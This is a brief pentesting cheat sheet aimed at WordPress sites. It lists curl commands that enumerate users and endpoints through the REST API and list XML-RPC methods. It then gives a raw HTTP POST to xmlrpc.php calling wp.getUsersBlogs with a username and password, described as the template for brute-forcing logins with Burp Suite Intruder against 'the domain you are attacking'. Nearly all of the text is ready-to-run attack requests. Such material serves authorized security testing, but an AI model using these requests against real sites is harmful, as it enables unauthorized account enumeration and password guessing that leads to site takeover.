# Pentesting Wordpress

## Rest API User Enumeration

    curl -k https://$DOMAIN/wp-json/wp/v2/users
    curl -k https://$DOMAIN/wp-json/akismet/v1
    curl -k https://$DOMAIN/wp-json
    curl -k https://$DOMAIN/wp-json/wp/v2/pages

## Brute Force Login

### List all methods
    
    curl -L -X POST -d '<methodCall> <methodName>system.listMethods</methodName> <params></params> </methodCall>' https://$DOMAIN/xmlrpc.php
    
    
### POST Request
This is used for the brute force login.  Replace $DOMAIN with the domain you are attacking. Use Burp Suite Intruder to attack.

```
POST //xmlrpc.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate
Content-Length: 264
Host: $DOMAIN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Connection: Keep-alive
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall> <methodName>wp.getUsersBlogs</methodName>
<params> <param><value><string>admin</string></value></param>
<param><value><string>894437894437534447</string></value> </param>
</params>
</methodCall>
```
